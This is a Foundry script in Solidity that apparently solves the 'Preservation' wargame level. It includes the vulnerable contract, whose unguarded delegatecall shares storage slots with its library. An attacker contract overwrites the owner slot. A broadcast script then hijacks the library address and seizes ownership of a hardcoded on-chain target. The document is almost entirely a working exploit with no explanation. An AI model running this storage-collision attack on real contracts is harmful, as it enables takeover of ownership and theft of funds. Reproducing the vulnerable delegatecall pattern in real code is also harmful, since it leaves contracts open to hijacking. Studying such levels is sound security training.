// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "openzeppelin-contracts/token/ERC20/IERC20.sol";

import "forge-std/Script.sol";
import "forge-std/Test.sol";

contract Preservation {
  // public library contracts
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner;
  uint256 storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
    timeZone1Library = _timeZone1LibraryAddress;
    timeZone2Library = _timeZone2LibraryAddress;
    owner = msg.sender;
  }

  // set the time for timezone 1
  function setFirstTime(uint256 _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint256 _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

contract AttackContract {
  address public filler1;
  address public filler2;
  address public owner;

  function setTime(uint256 value) public {
    owner = address(uint160(value));
  }
}

contract Solve is Script, Test {
  address target = address(0xbD0c2Ab7A25267714be8C47BeE3A5ca3DD017A70);

  function run() public {
    vm.startBroadcast();

    AttackContract attack = new AttackContract();
    Preservation p = Preservation(target);

    bytes32 firstSlot = vm.load(target, bytes32(abi.encode(0)));
    emit log_named_bytes("First slot", abi.encodePacked(firstSlot));

    uint256 valuePayload = uint256(uint160(address(attack)));
    bytes32 finalPayload = bytes32(valuePayload);
    emit log_named_bytes("Final payload", abi.encodePacked(finalPayload));
    p.setFirstTime(valuePayload);

    console.log("timeZone1Library", p.timeZone1Library());
    console.log("timeZone2Library", p.timeZone2Library());

    require(p.timeZone1Library() == address(attack), "Failed to attack time zone 1");
    p.setFirstTime(uint256(uint160(bytes20(msg.sender))));
    require(p.owner() == msg.sender, "Failed to set right owner");

    vm.stopBroadcast();
  }
}
